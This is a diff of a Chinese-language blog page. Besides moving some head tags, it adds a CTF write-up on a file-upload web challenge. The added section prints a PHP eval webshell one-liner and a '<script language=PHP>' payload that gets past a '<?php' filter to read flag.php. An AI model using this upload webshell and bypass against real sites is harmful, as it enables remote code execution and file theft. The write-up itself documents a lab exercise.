@@ -29,10 +29,10 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 4.2.1">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><link rel="alternate" href="/atom.xml" title="Airi Suzuki" type="application/atom+xml">
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Airi Suzuki" type="application/atom+xml">
 
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
@@ -504,7 +504,24 @@
 <p>运行结果</p>
 <p><img src="https://z3.ax1x.com/2021/07/15/Wua8Bj.png" alt=""></p>
 <p>得到flag{3e30f1ea-76b3-4aad-ba21-b631dc8eb224}</p>
-<p>7/15/2021 8:55:34 PM </p>
+<h2 id="4、Web-Upload"><a href="#4、Web-Upload" class="headerlink" title="4、Web Upload"></a>4、Web Upload</h2><p>题目内容：<br>想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中  </p>
+<p><img src="https://www.hualigs.cn/image/60f1b218a502d.jpg" alt=""></p>
+<p>可以上传文件，并且上传之后可以点击源码链接打开文件，上传了这几句话：</p>
+<!--?php
+@eval($POST["code"]);
+?-->
+
+<p><img src="https://www.hualigs.cn/image/60f1b218a844f.jpg" alt=""></p>
+<p>结果发现&lt;?php被过滤了，于是用php脚本标记来绕过过滤：</p>
+<script language="PHP">
+$f=fopen("../flag.".strtolower("PHP"),'r');
+echo fread($f,filesize("../flag.".strtolower("PHP"))); 
+fclose($f);
+</script>
+
+<p>查看源码，点击/u/x.php即可得到flag。<br>这里附上PHP四种标记风格链接<a href="https://blog.csdn.net/qq_35085863/article/details/76714367" target="_blank" rel="noopener">https://blog.csdn.net/qq_35085863/article/details/76714367</a></p>
+<p><img src="https://www.hualigs.cn/image/60f1b218e6bf0.jpg" alt=""></p>
+<p>7/15/2021 8:55:34 PM</p>
 
                 
             </div>
